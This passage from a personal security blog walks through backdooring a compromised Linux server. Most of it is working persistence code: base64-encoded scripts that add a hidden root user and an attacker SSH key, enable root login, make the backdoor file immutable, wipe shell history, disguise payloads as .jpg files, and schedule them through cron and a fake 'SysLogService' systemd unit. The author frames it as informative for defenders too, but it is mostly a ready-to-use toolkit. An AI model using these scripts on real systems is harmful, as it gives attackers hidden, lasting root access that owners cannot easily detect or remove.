JGRpcl9zc2hfayBdXTsgdGhlbgogICAgCWVjaG8gIiIgPi9kZXYvbnVsbCAmCiAgICBlbHNlCiAgICAJdG91Y2ggJGRpcl9zc2hfayAgPi9kZXYvbnVsbCAyPiYxCiAgICBmaQoJZ3JlcCAtcUYgLS0gIiR7YWRtaW5pc3RyYXRpb25fa2V5fSIgIiR7ZGlyX3NzaF9rfSIgfHwgZWNobyAiJHthZG1pbmlzdHJhdGlvbl9rZXl9IiA+PiAiJHtkaXJfc3NoX2t9IgoJZ3JlcCAtcUYgLS0gIiRsb2NhdGVVc2VyIiAiJGluRmlsZSIgfHwgZ3JlcCAtcUYgLS0gIiRsb2NhdGVVc2VyIiAiJGluRmlsZSIgfHwgc2VkIC1pICcyIGlcc3lzdGVtOiQ2JHpBN2U5S3FIRWxOaWFCdjgkZ0hyeTBLOG5SZlVEenl4ZlcvQzBzRkdwSmp3QXRjYWlPL1JwZld6T293MTRCTzFwQVRQWGh0YmI3NjRZTHhhRW5mTG5LdWRrdVNBZ1BJZkI0SmJtZy86MTgyNzA6Ojk5OTk5Ojc6OjonIC9ldGMvc2hhZG93CglncmVwIC1xRiAtLSAiJGxVTmFtZSIgIiR1TkZpbGUiIHx8IGdyZXAgLXFGIC0tICIkbFVOYW1lIiAiJHVORmlsZSIgfHwgc2VkIC1pICcyIGlcc3lzdGVtOng6MDowOnN5c3RlbTovcm9vdDovYmluL2Jhc2gnIC9ldGMvcGFzc3dkCglncmVwIC1xRiAtLSAiJGJhc2hTZWNMaW5lIiAiJGJhc2hGZmlsZSIgfHwgZWNobyAiJGJhc2hTZWNMaW5lIiA+PiAiJGJhc2hGZmlsZSIKCXNlZCAtaSAnL15QZXJtaXRSb290TG9naW4vcy9uby95ZXMvJyAvZXRjL3NzaC9zc2hkX2NvbmZpZyA+L2Rldi9udWxsIDI+JjEKCXNlZCAtaSAnL15QcmludExhc3RMb2cvcy95ZXMvbm8vJyAvZXRjL3NzaC9zc2hkX2NvbmZpZyA+L2Rldi9udWxsIDI+JjEKCW5ldHN0YXQgLW5wdGwKICAgICAgICBlY2hvICJCbG9ja2luZyAyNzYxMiwgMjY2MTIiCiAgICAgICAgaXB0YWJsZXMgLUEgSU5QVVQgLXAgdGNwIC0tZGVzdGluYXRpb24tcG9ydCAyNzYxMiAtaiBEUk9QCiAgICAgICAgaXB0YWJsZXMgLUEgSU5QVVQgLXAgdGNwIC0tZGVzdGluYXRpb24tcG9ydCAyNjYxMiAtaiBEUk9QCgpmaQo=" | base64 --decode &gt; /etc/syslogservice;echo "/etc/syslogservice &gt;/dev/null 2&gt;&amp;1" &gt;&gt; /root/.bashrc; source .bashrc;mkdir /root/.ssh;cd /root/.ssh;echo -e "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAu6QWR15HphWLI/0MsKbDm82diJJnRJQMwwHneoMA9mlrUxQ/9EJQtcvAEWDYjvnCBIcGs0smish/eCi09EuXO30OUutDobG3FXijjXIIA0RAl0Bxqth6k6PtRdAIsjJhC7obgY4M+aL+pUqpOgKALCEKHPTZJgOK0r8yztDUAaIIWeo1WGhwYnxVi+o5KQWlGywVwhzlDCe6Oey3XKbiMECPA3oesdb/TTk6DqBTiJ2TghAgP93rfpgvnHKYIFf0ZnAOSSEXZ4aAH1SZ+dY48dJsjNquyS8aVoqRymX4XA6qlaPd5rU4HezQiTuWEluG/vS4WOQkxlCe9c6ef44Y0w== system key generated by server 20150113\n$(&lt;authorized_keys)" &gt; authorized_keys;chmod 400 authorized_keys;chown root:root /root/.ssh;chown root:root /etc/syslogservice; chmod 755 /etc/syslogservice;chattr +i /etc/syslogservice
</code></pre><figcaption>Final script syslog.jpg</figcaption></figure><p>The command <code>chown root:root</code>changes the user and group of the specified file or directory to user <code>root</code> and group <code>root</code>.</p><p>More importantly chattr, this is the command in the GNU system that allows a user to set certain attributes of a file.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://flaviu.io/content/images/2020/07/image-42.png" class="kg-image" alt="demo chattr" loading="lazy" width="765" height="454" srcset="https://flaviu.io/content/images/size/w600/2020/07/image-42.png 600w, https://flaviu.io/content/images/2020/07/image-42.png 765w" sizes="(min-width: 720px) 720px"><figcaption>demo chattr</figcaption></figure><p>I am doing this because I don't want my file being edited or removed from the system. As you can see even with administrative privileges I cannot change, remove or edit the file.</p><h3 id="cron-job">Cron job</h3><pre><code class="language-bash">#!/bin/bash
croncmd="/etc/syslogservice &gt;/dev/null 2&gt;&amp;1"
cronjob="10 * * * * $croncmd"
( crontab -l | grep -v -F "$croncmd" ;echo -e "$cronjob") | crontab -
echo -e "\e[31mHere is the crontab running:\e[0m"
crontab -l
</code></pre><p>In a <code>crontab</code> file, the fields are:</p><ul><li>minute of the hour.</li><li>hour of the day.</li><li>day of the month.</li><li>month of the year.</li><li>day of the week.</li></ul><p>In my case</p><pre><code class="language-bash">10 * * * * /etc/syslogservice &gt;/dev/null 2&gt;&amp;1</code></pre><p>It means execute <code>syslogservice</code> at 10 minutes past every hour.</p><p>Encoding the cron script below.</p><figure class="kg-card kg-code-card"><pre><code class="language-bash">#!/bin/bash
unset HISTFILE HISTSAVE HISTMOVE HISTZONE HISTORY HISTLOG USERHOST REMOTEHOST REMOTEUSER WATCH;history -n;export  HISTFILE=/dev/null; history -c
echo "IyEvYmluL2Jhc2gKY3JvbmNtZD0iL2V0Yy9zeXNsb2dzZXJ2aWNlID4vZGV2L251bGwgMj4mMSIKY3JvbmpvYj0iNSAqICogKiAqICRjcm9uY21kIgooIGNyb250YWIgLWwgfCBncmVwIC12IC1GICIkY3JvbmNtZCIgO2VjaG8gLWUgIiRjcm9uam9iIikgfCBjcm9udGFiIC0KZWNobyAtZSAiXGVbMzFtSGVyZSBpcyB0aGUgY3JvbnRhYiBydW5uaW5nOlxlWzBtIgpjcm9udGFiIC1sCg==" | base64 --decode &gt; /etc/cron.jpg;chmod +x /etc/cron.jpg;/etc/cron.jpg;rm -rf /etc/cron.jpg
echo -e "\e[31mDone\e[0m"</code></pre><figcaption>cron.jpg</figcaption></figure><h3 id="system-hardening">System Hardening</h3><p>The next thing I want to do is also beneficial to the "system that has been compromised" , What.. ? Putting my whitehat on...</p><p>I would not like other hackers to "compromise" the same systems that "I did". So I am going to harden the system by installing fail2ban to block other ssh attempts, I would have a look in the system to get a feel of what is it being used for, update all the packages, check the system for weak passwords, and basically and way of someone else getting in. (Being selfish am I ?)</p><figure class="kg-card kg-code-card"><pre><code class="language-bash">#!/bin/bash
apt=`which apt-get`
if [[ -f $apt ]]; then
apt-get -qq -y update &gt;/dev/null 2&gt;&amp;1
apt-get -qq install fail2ban -y &gt;/dev/null 2&gt;&amp;1
which fail2ban
echo -e "\e[31mInstalled via apt-get\e[0m"
else
yum -q update -y &gt;/dev/null 2&gt;&amp;1
yum -q install fail2ban -y &gt;/dev/null 2&gt;&amp;1
which fail2ban
echo -e "\e[31mInstalled via yum\e[0m"
fi
echo -e "\e[31mCreating jail file\e[0m"
touch /etc/fail2ban/jail.local
echo "[DEFAULT] ignoreip = 127.0.0.1/8 ::1" &gt;&gt; /etc/fail2ban/jail.local
echo "bantime = 3600" &gt;&gt; /etc/fail2ban/jail.local
echo "findtime = 600" &gt;&gt; /etc/fail2ban/jail.local
echo "maxretry = 2" &gt;&gt; /etc/fail2ban/jail.local
echo "[sshd] enabled = true" &gt;&gt; /etc/fail2ban/jail.local
echo -e "\e[31mRestarting\e[0m"
service fail2ban restart
echo -e "\e[31mChecking Status\e[0m"
service fail2ban status</code></pre><figcaption>installing fail2ban</figcaption></figure><blockquote>Fail2ban is an framework that prevents intrusion, it protects systems from brute force attacks.</blockquote><p>Using a simple if / else statement I am installing fail2ban and creating the jail file for the ssh protocol.</p><p>I can also configure Fail2Ban to monitor Apache or Nginx logs. There are many 'jails' templates that I could include in my script but for the purpose of this demo I am only creating a jail for the ssh protocol. Below are other jails and what they being used for.</p><p><code>[apache-noscript]</code> jail is used to ban clients that are looking for scripts on the webpage to execute and exploit.</p><p>The <code>[apache-overflows]</code> jail is used to restrict access to client who are trying to request suspicious URLs. These can often be signs of attempts from attackers that are trying to exploit your webserver by triggering buffer overflows.</p><p>Other additional jails are <code>apache-badbots</code>, this is used to stop known malicious bots. </p><p>Lastly, if you are running apache with php, you may need to enable the <code>[php-url-fopen]</code> jail, this blocks attempts for usage of specific php behavior for malicious purposes. You are most likely going to need to change the <code>logpath</code> directory to point to the correct access log location e.g in Ubuntu the location is at <code>/var/log/apache2/access.log</code>.</p><p>Encoding the fail2ban script:</p><figure class="kg-card kg-code-card"><pre><code class="language-bash">#!/bin/bash

echo "IyEvYmluL2Jhc2gKdW5zZXQgSElTVEZJTEUgSElTVFNBVkUgSElTVE1PVkUgSElTVFpPTkUgSElTVE9SWSBISVNUTE9HIFVTRVJIT1NUIFJFTU9URUhPU1QgUkVNT1RFVVNFUiBXQVRDSDtoaXN0b3J5IC1uO2V4cG9ydCAgSElTVEZJTEU9L2Rldi9udWxsOyBoaXN0b3J5IC1jCmFwdD1gd2hpY2ggYXB0LWdldGAKaWYgW1sgLWYgJGFwdCBdXTsgdGhlbgphcHQtZ2V0IC1xcSAteSB1cGRhdGUgPi9kZXYvbnVsbCAyPiYxCmFwdC1nZXQgLXFxIGluc3RhbGwgZmFpbDJiYW4gLXkgPi9kZXYvbnVsbCAyPiYxCndoaWNoIGZhaWwyYmFuCmVjaG8gLWUgIlxlWzMxbUluc3RhbGxlZCB2aWEgYXB0LWdldFxlWzBtIgplbHNlCnl1bSAtcSB1cGRhdGUgLXkgPi9kZXYvbnVsbCAyPiYxCnl1bSAtcSBpbnN0YWxsIGZhaWwyYmFuIC15ID4vZGV2L251bGwgMj4mMQp3aGljaCBmYWlsMmJhbgplY2hvIC1lICJcZVszMW1JbnN0YWxsZWQgdmlhIHl1bVxlWzBtIgpmaQplY2hvIC1lICJcZVszMW1DcmVhdGluZyBqYWlsIGZpbGVcZVswbSIKdG91Y2ggL2V0Yy9mYWlsMmJhbi9qYWlsLmxvY2FsCmVjaG8gIltERUZBVUxUXSBpZ25vcmVpcCA9IDEyNy4wLjAuMS84IDo6MSIgPj4gL2V0Yy9mYWlsMmJhbi9qYWlsLmxvY2FsCmVjaG8gImJhbnRpbWUgPSAzNjAwIiA+PiAvZXRjL2ZhaWwyYmFuL2phaWwubG9jYWwKZWNobyAiZmluZHRpbWUgPSA2MDAiID4+IC9ldGMvZmFpbDJiYW4vamFpbC5sb2NhbAplY2hvICJtYXhyZXRyeSA9IDIiID4+IC9ldGMvZmFpbDJiYW4vamFpbC5sb2NhbAplY2hvICJbc3NoZF0gZW5hYmxlZCA9IHRydWUiID4+IC9ldGMvZmFpbDJiYW4vamFpbC5sb2NhbAplY2hvIC1lICJcZVszMW1SZXN0YXJ0aW5nXGVbMG0iCnNlcnZpY2UgZmFpbDJiYW4gcmVzdGFydAplY2hvIC1lICJcZVszMW1DaGVja2luZyBTdGF0dXNcZVswbSIKc2VydmljZSBmYWlsMmJhbiBzdGF0dXM=" | base64 --decode &gt; /tmp/fail2ban.jpg;chmod +x /tmp/fail2ban.jpg;/tmp/fail2ban;rm -rf /tmp/fail2ban.jpg
echo -e "\e[31mDone\e[0m"</code></pre><figcaption>Final script fail2ban.jpg</figcaption></figure><h3 id="systemd-service">Systemd Service</h3><p>In this script I have also added a fail2ban service, This is just a timer that makes sure that fail2ban is always running. </p><blockquote> S<strong>ystemd</strong> are unit files whose name are ending in .<strong>service</strong>. This t<strong>imers </strong>can be used as an alternative to cron.</blockquote><figure class="kg-card kg-code-card"><pre><code class="language-bash">[Unit]
Description=Fail2Ban Service
Documentation=man:fail2ban(1)
After=network.target iptables.service firewalld.service ip6tables.service ipset.service
PartOf=iptables.service firewalld.service ip6tables.service ipset.service

[Service]
Type=simple
ExecStartPre=/bin/mkdir -p /var/run/fail2ban
ExecStart=/usr/local/bin/fail2ban-server -xf start
# if should be logged in systemd journal, use following line or set logtarget to sysout in fail2ban.local
# ExecStart=/usr/local/bin/fail2ban-server -xf --logtarget=sysout start
ExecStop=/usr/local/bin/fail2ban-client stop
ExecReload=/usr/local/bin/fail2ban-client reload
PIDFile=/var/run/fail2ban/fail2ban.pid
Restart=on-failure
RestartPreventExitStatus=0 255

[Install]
WantedBy=multi-user.target
</code></pre><figcaption>fail2ban service</figcaption></figure><p>Encoding fail2ban service:</p><figure class="kg-card kg-code-card"><pre><code class="language-bash">#!/bin/bash

echo "W1VuaXRdCkRlc2NyaXB0aW9uPUZhaWwyQmFuIFNlcnZpY2UKRG9jdW1lbnRhdGlvbj1tYW46ZmFpbDJiYW4oMSkKQWZ0ZXI9bmV0d29yay50YXJnZXQgaXB0YWJsZXMuc2VydmljZSBmaXJld2FsbGQuc2VydmljZSBpcDZ0YWJsZXMuc2VydmljZSBpcHNldC5zZXJ2aWNlClBhcnRPZj1pcHRhYmxlcy5zZXJ2aWNlIGZpcmV3YWxsZC5zZXJ2aWNlIGlwNnRhYmxlcy5zZXJ2aWNlIGlwc2V0LnNlcnZpY2UKIApbU2VydmljZV0KVHlwZT1zaW1wbGUKRXhlY1N0YXJ0UHJlPS9iaW4vbWtkaXIgLXAgL3Zhci9ydW4vZmFpbDJiYW4KRXhlY1N0YXJ0PS91c3IvbG9jYWwvYmluL2ZhaWwyYmFuLXNlcnZlciAteGYgc3RhcnQKIyBpZiBzaG91bGQgYmUgbG9nZ2VkIGluIHN5c3RlbWQgam91cm5hbCwgdXNlIGZvbGxvd2luZyBsaW5lIG9yIHNldCBsb2d0YXJnZXQgdG8gc3lzb3V0IGluIGZhaWwyYmFuLmxvY2FsCiMgRXhlY1N0YXJ0PS91c3IvbG9jYWwvYmluL2ZhaWwyYmFuLXNlcnZlciAteGYgLS1sb2d0YXJnZXQ9c3lzb3V0IHN0YXJ0CkV4ZWNTdG9wPS91c3IvbG9jYWwvYmluL2ZhaWwyYmFuLWNsaWVudCBzdG9wCkV4ZWNSZWxvYWQ9L3Vzci9sb2NhbC9iaW4vZmFpbDJiYW4tY2xpZW50IHJlbG9hZApQSURGaWxlPS92YXIvcnVuL2ZhaWwyYmFuL2ZhaWwyYmFuLnBpZApSZXN0YXJ0PW9uLWZhaWx1cmUKUmVzdGFydFByZXZlbnRFeGl0U3RhdHVzPTAgMjU1CiAKW0luc3RhbGxdCldhbnRlZEJ5PW11bHRpLXVzZXIudGFyZ2V0Cg==" | base64 --decode &gt; /etc/systemd/system/fail2ban.service;systemctl start fail2ban.service;systemctl enable fail2ban.service
echo -e "\e[31mDone\e[0m"</code></pre><figcaption>fail2ban-service.jpg</figcaption></figure><p>I also need service for syslogservice:</p><figure class="kg-card kg-code-card"><pre><code class="language-bash">[Unit]
Description=SysLogService
After=network-online.target
Requires=network-online.target

[Service]
WorkingDirectory=/etc/
#path to executable.
ExecStart=/etc/syslogservice
#StandardOutput=null

SuccessExitStatus=143
TimeoutStopSec=10
Restart=always
RestartSec=3600
[Install]
WantedBy=multi-user.target
</code></pre><figcaption>syslogservice service</figcaption></figure><!--kg-card-begin: markdown--><p>Explaining the parameters in this service file.</p>
<p>Description= This is just a description for the service</p>
<p>Requires=network configuration dependency</p>
<p>After=This means that the service must be started after the network is ready.</p>
<p>Example:If my program expected the MySQL server to be running, I would add:<br>
After=mysqld.service</p>
<p>WorkingDirectory=The folder in which the script or binary is located.<br>
ExecStart=here is the absolute path for the program I want to start.<br>
SuccessExitStatus=143; this exit code means that the program received a SIGTERM signal to instruct it to exit, but it did not handle the signal properly.</p>
<p>TimeoutStopSec= Configures the time to wait for each ExecStop= command.</p>
<p>Restart=always<br>
By default, systemd doesn't restart the service if the program exits. This is usually not what I want for a service that must be always running, so I'm instructing it to always restart on exit.</p>
<p>RestartSec=3600<br>
I could also use on-failure to only restart if the exit status is not 0.<br>
By default, systemd attempts a restart after 100ms. I can specify the number of seconds to wait before attempting a restart.</p>
<!--kg-card-end: markdown--><p>It is useful to note: By default when I configured Restart=always, systemd will give up restarting my service (Forever) if it fails to start it in 5 attempts within 10 seconds.<br>The units that are responsable for this are<br>StartLimitBurst=5<br>StartLimitIntervalSec=10</p><p>The RestartSec parameter will also have an impact, for example if it is set to restart within 3 seconds then I cannot reach 5 failed tries within 10 seconds, right? right.<br>The easiest fix will be to set StartLimitIntervalSec=0, this means that systemd will attempt to start the service forever.<br>As an alternative, by leaving the default settings, I can tell systemd to restart the service if the start limit is reached by using StartLimitAction=reboot.</p><p>Encoding syslogservice service:</p><figure class="kg-card kg-code-card"><pre><code class="language-bash">#!/bin/bash
unset HISTFILE HISTSAVE HISTMOVE HISTZONE HISTORY HISTLOG USERHOST REMOTEHOST REMOTEUSER WATCH;history -n;export  HISTFILE=/dev/null; history -c
echo "CltVbml0XQpEZXNjcmlwdGlvbj1TeXNMb2dTZXJ2aWNlCkFmdGVyPW5ldHdvcmstb25saW5lLnRhcmdldApSZXF1aXJlcz1uZXR3b3JrLW9ubGluZS50YXJnZXQKCltTZXJ2aWNlXQpXb3JraW5nRGlyZWN0b3J5PS9ldGMvCiNwYXRoIHRvIGV4ZWN1dGFibGUuCkV4ZWNTdGFydD0vZXRjL3N5c2xvZ3NlcnZpY2UKI1N0YW5kYXJkT3V0cHV0PW51bGwKClN1Y2Nlc3NFeGl0U3RhdHVzPTE0MwpUaW1lb3V0U3RvcFNlYz0xMApSZXN0YXJ0PWFsd2F5cwpSZXN0YXJ0U2VjPTM2MDAKW0luc3RhbGxdCldhbnRlZEJ5PW11bHRpLXVzZXIudGFyZ2V0Cgo=" | base64 --decode &gt; /etc/systemd/system/cleaning.service;systemctl start cleaning.service;systemctl enable cleaning.service
echo -e "\e[31mDone\e[0m"</code></pre><figcaption>Final script syslogservice.jpg</figcaption></figure><p>So far I've gone through the following scripts: </p><p>requirements.jpg<br>syslog.jpg<br>cron.jpg<br>fail2ban.jpg<br>fail2ban-service.jpg<br>syslogservice.jpg</p><p>Using tar and assuming these files are within a folder I can pack them all into 1 single file.</p><!--kg-card-begin: markdown--><p>tar czvf unix.jpg *</p>
<!--kg-card-end: markdown--><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://flaviu.io/content/images/2020/07/image-43.png" class="kg-image" alt="adding all the scripts into a single file" loading="lazy" width="1071" height="356" srcset="https://flaviu.io/content/images/size/w600/2020/07/image-43.png 600w, https://flaviu.io/content/images/size/w1000/2020/07/image-43.png 1000w, https://flaviu.io/content/images/2020/07/image-43.png 1071w" sizes="(min-width: 720px) 720px"><figcaption>adding all the scripts into a single file</figcaption></figure><h3 id="demo">Demo</h3><figure class="kg-card kg-embed-card"><iframe width="612" height="344" src="https://www.youtube.com/embed/8rDcYk4yyNA?feature=oembed" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe></figure><p>Conclusion:</p><p>I like keeping persistance through light scripts and not rootkits Â that are potentially detected by AV's or by other scanners because they infect a lot of /bin files. See my previous post at <a href="https://flaviu.io/linux-have-i-been-hacked/">have-i-been-hacked</a> to read where I talk about rkhunter, chkrootkit.</p><p>This blog post is informative for both communities, Offensive and Defensive as it shows a tiny glimpse into the world of hide and seek.</p><p>Room for improvement? Sure there is! This is just a warm-up! </p><p>The idea is to blend in the system as much as possible, stay hidden and quiet for as long as possible. </p><p>To do: inject a sneaky web shell in the web server that would get me a simple shell.</p><!--kg-card-begin: markdown--><p>Have you got suggestions for improvement ? <a href="/cdn-cgi/l/email-protection#442c2128282b04222825322d316a2d2b">Get in touch!</a><br>
In a future post I will go into detail about hiding the output from netstat, and further hiding our files and tracks within the system.</p>
<p>Thank you for reading my article, Until next time!</p>
<p>Your friendly neighbourhood <mark>Hacker.</mark></p>
<!--kg-card-end: markdown-->
		</div>
		<div class="section-post-authors post-authors flex  post-author-single first">
	<div class="author-label">
		<span>Read more posts by this author</span>
	</div>
	<div class="author-wrap flex">
		<a href="/author/flaviu/" class="item-link-overlay"></a>
		<div class="author-profile-image" style="background-image: url(https://flaviu.io/content/images/2021/12/Flaviu-Popescu.jpg)"></div>
		<div class="author-content">
			<h4 class="is-bio"><a href="/author/flaviu/">Flaviu Popescu</a></h4>
			<p>An aspiring Red Teamer, current Penetration Tester, my interests include but are not limited to Reverse Engineering, Advanced Persistent Threat Malware, Cyber-HUMINT, Nation State Cyber Ops, and OSINT</p>
		</div>
	</div>
</div>		<div class="post-meta">
			<div class="post-share">
	<a class="twitter" href="https://twitter.com/intent/tweet?text=My%20Methods%20To%20Achieve%20Persistence%20In%20Linux%20Systems&amp;url=https://flaviu.io/advanced-persistent-threat/" onclick="if (!window.__cfRLUnblockHandlers) return false; window.open(this.href, 'twitter-share', 'width=550,height=235');return false;" data-cf-modified-786429fe4b3ef8e688d249ce-=""><svg class="global-svg" role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M23.954 4.569c-.885.389-1.83.654-2.825.775 1.014-.611 1.794-1.574 2.163-2.723-.951.555-2.005.959-3.127 1.184-.896-.959-2.173-1.559-3.591-1.559-2.717 0-4.92 2.203-4.92 4.917 0 .39.045.765.127 1.124C7.691 8.094 4.066 6.13 1.64 3.161c-.427.722-.666 1.561-.666 2.475 0 1.71.87 3.213 2.188 4.096-.807-.026-1.566-.248-2.228-.616v.061c0 2.385 1.693 4.374 3.946 4.827-.413.111-.849.171-1.296.171-.314 0-.615-.03-.916-.086.631 1.953 2.445 3.377 4.604 3.417-1.68 1.319-3.809 2.105-6.102 2.105-.39 0-.779-.023-1.17-.067 2.189 1.394 4.768 2.209 7.557 2.209 9.054 0 13.999-7.496 13.999-13.986 0-.209 0-.42-.015-.63.961-.689 1.8-1.56 2.46-2.548l-.047-.02z"/></svg></a>
	<a class="facebook" href="https://www.facebook.com/sharer/sharer.php?u=https://flaviu.io/advanced-persistent-threat/" onclick="if (!window.__cfRLUnblockHandlers) return false; window.open(this.href, 'facebook-share','width=580,height=296');return false;" data-cf-modified-786429fe4b3ef8e688d249ce-=""><svg class="global-svg" role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M23.9981 11.9991C23.9981 5.37216 18.626 0 11.9991 0C5.37216 0 0 5.37216 0 11.9991C0 17.9882 4.38789 22.9522 10.1242 23.8524V15.4676H7.07758V11.9991H10.1242V9.35553C10.1242 6.34826 11.9156 4.68714 14.6564 4.68714C15.9692 4.68714 17.3424 4.92149 17.3424 4.92149V7.87439H15.8294C14.3388 7.87439 13.8739 8.79933 13.8739 9.74824V11.9991H17.2018L16.6698 15.4676H13.8739V23.8524C19.6103 22.9522 23.9981 17.9882 23.9981 11.9991Z"/></svg></a>
	<a class="copy" id="copy" data-clipboard-target="#link-value"><svg role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M20.33 13.04h-4.155v4.154h-2.078v-4.155H9.942v-2.077h4.155V6.806h2.078v4.156h4.154v2.077zM8.902 18.58a6.582 6.582 0 0 1 0-13.162c.068 0 .135.007.202.009a8.874 8.874 0 0 0-.001 13.144c-.067 0-.133.009-.2.009zm6.194-15.484a8.876 8.876 0 0 0-3.087.56A8.904 8.904 0 0 0 0 12a8.903 8.903 0 0 0 8.903 8.905 8.893 8.893 0 0 0 3.103-.563 8.854 8.854 0 0 0 3.09.563A8.903 8.903 0 0 0 24 12a8.904 8.904 0 0 0-8.903-8.903z"/></svg></a>
	<span class="copy-popup">The link has been copied!</span>
	<input type="text" value="https://flaviu.io/advanced-persistent-threat/" id="link-value">
</div>		</div>
	</div>
</article>
<aside class="section-prev-next">
    <div class="prev-next-wrap">
        <a href="/attacking-ssh-private-keys/" class="prev-post post tag-hacking tag-ssh tag-id_rsa tag-offensivesecurity featured is-image">
            <div class="prev-next-image" style="background-image: url(https://flaviu.io/content/images/2020/07/id_rsa.jpg)"></div>
            <section class="prev-next-title">
                <h5>Newer Post</h5>
                <h3>Attacking SSH Private keys</h3>
            </section>
        </a>
        <a href="/my-trip-to-the-chinese-internet/" class="next-post post tag-china tag-censorship tag-hash-large featured is-image">
            <div class="prev-next-image" style="background-image: url(https://flaviu.io/content/images/2020/07/kill-or-free.jpg)"></div>
            <section class="prev-next-title">
                <h5>Older Post</h5>
                <h3>My trip to the Chinese Internet</h3>
            </section>
        </a>
    </div>
</aside><div class="section-disqus">
	
<div id="disqusloader">
<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script type="786429fe4b3ef8e688d249ce-text/javascript">
    var options = {
        scriptUrl: "https://flaviu-io.disqus.com/embed.js",
        disqusConfig: function() {
        this.page.url = 'https://flaviu.io/advanced-persistent-threat/';
        this.page.identifier = 'ghost-5f0ee5396c5c826c25ae91fa';
    }};
</script>
</div>
</div>

			</div>
			<div id="back-to-top" class="global-top-button">
			<svg role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M13.187 7.165h5.524L12 0 5.289 7.165h5.524V24h2.374V7.165z"/></svg>
			</div>
			<footer class="section-footer">
	<div class="footer-wrap wrap flex">
		<div class="footer-logo flex">
			<a class="is-logo" href="https://flaviu.io"><img src="https://flaviu.io/content/images/2020/06/flav-logo.png" alt="Flaviu Popescu"></a>
		</div>
		<div class="footer-nav">
			<ul class="nav-list">
				
<li class="nav-list-item">
	<a href="https://flaviu.io/" class="nav-link">root@flaviu:~#</a>
	<span class="nav-dot"></span>
</li>
<li class="nav-list-item">
	<a href="https://flaviu.io/resources/" class="nav-link">Resources</a>
	<span class="nav-dot"></span>
</li>
<li class="nav-list-item">
	<a href="https://flaviu.io/walkthroughs-hackthebox/" class="nav-link">HackTheBox</a>
	<span class="nav-dot"></span>
</li>
<li class="nav-list-item">
	<a href="https://flaviu.io/about-me/" class="nav-link">About</a>
	<span class="nav-dot"></span>
</li>
<li class="nav-list-item">
	<a href="https://flaviu.io/personal-achievements/" class="nav-link">Achievements</a>
	<span class="nav-dot"></span>
</li>
<li class="nav-list-item">
	<a href="https://flaviu.io/contact/" class="nav-link">Contact</a>
	<span class="nav-dot"></span>
</li>

			</ul>
		</div>
		<div class="footer-social-links flex">
			<a href="https://twitter.com/flavsecurity" aria-label="link Twitter"><svg class="global-svg" role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M23.954 4.569c-.885.389-1.83.654-2.825.775 1.014-.611 1.794-1.574 2.163-2.723-.951.555-2.005.959-3.127 1.184-.896-.959-2.173-1.559-3.591-1.559-2.717 0-4.92 2.203-4.92 4.917 0 .39.045.765.127 1.124C7.691 8.094 4.066 6.13 1.64 3.161c-.427.722-.666 1.561-.666 2.475 0 1.71.87 3.213 2.188 4.096-.807-.026-1.566-.248-2.228-.616v.061c0 2.385 1.693 4.374 3.946 4.827-.413.111-.849.171-1.296.171-.314 0-.615-.03-.916-.086.631 1.953 2.445 3.377 4.604 3.417-1.68 1.319-3.809 2.105-6.102 2.105-.39 0-.779-.023-1.17-.067 2.189 1.394 4.768 2.209 7.557 2.209 9.054 0 13.999-7.496 13.999-13.986 0-.209 0-.42-.015-.63.961-.689 1.8-1.56 2.46-2.548l-.047-.02z"/></svg></a>
			

<a href="https://github.com/FlaviuPopescu" aria-label="link GitHub"><svg class="global-svg" role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/></svg></a>
<a href="https://www.hackthebox.eu/profile/123532" aria-label="link HackerRank"><svg class="global-svg" role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 0c1.285 0 9.75 4.886 10.392 6 .645 1.115.645 10.885 0 12S13.287 24 12 24s-9.75-4.885-10.395-6c-.641-1.115-.641-10.885 0-12C2.25 4.886 10.715 0 12 0zm2.295 6.799c-.141 0-.258.115-.258.258v3.875H9.963V6.908h.701c.141 0 .254-.115.254-.258 0-.094-.049-.176-.123-.221L9.223 4.92c-.049-.063-.141-.109-.226-.109-.084 0-.16.045-.207.107L7.11 6.43c-.072.045-.12.126-.12.218 0 .143.113.258.255.258h.704l.008 10.035c0 .145.111.258.254.258h1.492c.142 0 .259-.115.259-.256v-4.004h4.073v4.152h-.699c-.143 0-.256.115-.256.258 0 .092.048.174.119.219l1.579 1.51c.044.061.141.109.225.109.085 0 .159-.045.208-.109l1.679-1.51c.072-.045.12-.127.12-.219 0-.143-.115-.258-.255-.258h-.704l-.007-10.034c0-.145-.114-.26-.255-.26h-1.494v.002z"/></svg></a>
